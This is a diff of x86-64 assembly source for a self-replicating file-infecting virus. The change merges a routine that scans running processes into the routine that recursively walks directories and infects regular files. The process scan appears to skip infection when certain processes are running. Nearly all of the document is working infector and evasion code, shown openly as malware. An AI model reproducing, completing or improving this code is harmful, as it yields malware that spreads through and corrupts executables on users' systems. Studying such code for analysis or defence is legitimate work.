@@ -68,10 +68,14 @@ ret
 %endif; ========================================================================
 
 _inject:
-	pop rdi; pop addr from stack
-	call _check_for_process
+	lea rdi, [rel process_dir]
+	push 1
+	pop rsi
+	call _move_through_dir
 	cmp rax, 0x0
 	jne _end
+
+	pop rdi; pop addr from stack
 
 	; save register
 	push r8
@@ -90,11 +94,12 @@ _inject:
 		pop r9
 	; r9 contains the end of the virus (minus params)
 
+	xor rsi, rsi
 	lea rdi, [rel directories]
 	xor rcx, rcx; = 0
 	.loop_array_string:
 		add rdi, rcx
-		call _infect_dir
+		call _move_through_dir
 		xor rcx, rcx; = 0
 		.next_string:; seek next dir
 			inc rcx
@@ -110,16 +115,21 @@ _inject:
 		jne _infected
 		jmp _exit
 
-_infect_dir:; (string rdi)
+_move_through_dir:; (string rdi, int rsi); rsi -> 1 => process, -> 0 => infect
 	push r10
 	push r11
 	push r12
-	push rdx
+	push r13
+	push rbx
 	push rcx
+	push rdx
 
 	%ifdef DEBUG
 		call _print; _print(rdi)
 	%endif
+
+	push rsi
+	pop r13
 
 	push 2
 	pop rax; open
@@ -210,14 +220,36 @@ _infect_dir:; (string rdi)
 
 			mov rax, [rsi + 24] ; st_mode
 			and rax, 0o0170000 ; S_IFMT
-			cmp rax, 0o0040000 ; S_IFDIR
-			je .infect_dir
+
+			cmp r13, 0; infect
+			je .infect
+
+			; process
+			and rax, 0o0170000 ; S_IFMT
 			cmp rax, 0o0100000 ; S_IFREG
-			je .infect_file
-			jmp .free_buffers
+			jne .free_buffers
+			call _check_file_process
+
+			add rsp, 600
+			pop r11 ; stat using r11
+			add rsp, 4096
+			pop rbx
+
+			cmp rax, 0x0
+			jne .get_rcx_close
+
+			jmp .next_file
+
+			.infect:
+				cmp rax, 0o0040000 ; S_IFDIR
+				je .infect_dir
+				cmp rax, 0o0100000 ; S_IFREG
+				je .infect_file
+				jmp .free_buffers
 
 		.infect_dir:
-			call _infect_dir
+			mov rsi, rbx
+			call _move_through_dir
 			jmp .free_buffers
 
 		.infect_file:
@@ -239,7 +271,11 @@ _infect_dir:; (string rdi)
 			pop rdi
 			jmp .loop_in_file
 
+	.get_rcx_close:
+		pop rcx
 	.close:
+		push rax
+		pop rsi
 		push r11
 		pop rdi
 		push 3
@@ -248,14 +284,18 @@ _infect_dir:; (string rdi)
 		push r10
 		pop rdi
 		add rsp, 1024
+		push rsi
+		pop rax
 
 	.return:
 
-		pop rcx
-		pop rdx
-		pop r12
-		pop r11
-		pop r10
+	pop rdx
+	pop rcx
+	pop rbx
+	pop r13
+	pop r12
+	pop r11
+	pop r10
 ret
 
 _infect_file: ; (string rdi, stat rsi)
@@ -436,160 +476,6 @@ _infect_file: ; (string rdi, stat rsi)
 	pop rcx
 	pop rbx
 	pop r13
-	pop r12
-	pop r11
-	pop r10
-ret
-
-_check_for_process:
-	push r10
-	push r11
-	push r12
-	push rbx
-	push rcx
-	push rdx
-	push rdi
-
-	lea rdi, [rel process_dir]
-	push 2
-	pop rax; open
-	push 0o0200000; O_RDONLY | O_DIRECTORY
-	pop rsi
-	syscall
-	push rax
-	pop r11
-	push rdi
-	pop r10
-	xor rax, rax; if can't open, still infect
-	cmp r11, 0x0
-	jl .return; jump lower
-
-	sub rsp, 1024
-	.getdents:
-		push r11
-		pop rdi
-		push 78
-		pop rax; getdents
-		push 1024
-		pop rdx; size of buffer
-		mov rsi, rsp; buffer
-		syscall
-
-		push rdi
-		pop r11; fd
-		push rsi
-		pop r12; buffer
-		push rax
-		pop rdx; nread
-		xor rax, rax
-		cmp rdx, 0x0; if can't open, still infect
-		jle .close
-		xor rcx, rcx;
-
-
-	.loop_in_dir:
-		cmp rcx, rdx
-		jge .getdents; rcx >= rdx
-		mov rdi, r12
-		add rdi, rcx; r12 => linux_dir
-		; if not . .. +18
-		add rdi, 18; linux_dir->d_name
-
-		; ft_strcmp with '.' and '..' to not infect_dir with them
-		push rcx
-		lea rsi, [rel dotdir]
-		xor rcx, rcx; = 0
-		.loop_array_string:
-			add rsi, rcx
-			call _ft_strcmp
-			cmp rax, 0x0
-			je .next_dir
-			xor rcx, rcx; = 0
-			.next_string:; seek next dir
-				inc rcx
-				cmp byte[rsi + rcx], 0x0
-				jnz .next_string
-			inc rcx
-			cmp byte[rsi + rcx], 0x0
-			jnz .loop_array_string
-
-		; concat_path
-			push rbx
-			sub rsp, 4096
-
-			push rdi
-			pop rbx
-
-			mov rsi, r10
-			mov rdi, rsp; buffer
-			call _ft_strcpy
-			call _ft_strlen
-			add rdi, rax
-			mov byte[rdi], '/'
-			add rdi, 1
-			mov rsi, rbx
-			call _ft_strcpy
-			mov rdi, rsp
-
-		; check infect_dir or infect_file
-			push r11 ; stat using r11
-			sub rsp, 600
-
-			push 4
-			pop rax ; stat
-			mov rsi, rsp ; struct stat
-			syscall
-			cmp rax, 0x0
-			jne .free_buffers
-
-			mov rax, [rsi + 24] ; st_mode
-			and rax, 0o0170000 ; S_IFMT
-			cmp rax, 0o0100000 ; S_IFREG
-			jne .free_buffers
-			call _check_file_process
-
-			add rsp, 600
-			pop r11 ; stat using r11
-			add rsp, 4096
-			pop rbx
-
-			cmp rax, 0x0
-			jne .get_rcx_close
-
-			jmp .next_dir
-		.free_buffers:
-			add rsp, 600
-			pop r11 ; stat using r11
-			add rsp, 4096
-			pop rbx
-		.next_dir:
-			pop rcx
-			mov rsi, r12
-			add rsi, rcx
-			push rdi
-			movzx edi, word [rsi + 16]; linux_dir->d_reclen
-			add rcx, rdi
-			pop rdi
-			jmp .loop_in_dir
-	.get_rcx_close:
-		pop rcx
-	.close:
-		push rax
-		pop rsi
-		push r11
-		pop rdi; fd
-		push 3
-		pop rax; close
-		syscall
-		add rsp, 1024
-		push rsi
-		pop rax
-	.return:
-
-	pop rdi
-	pop rdx
-	pop rcx
-	pop rbx
 	pop r12
 	pop r11
 	pop r10
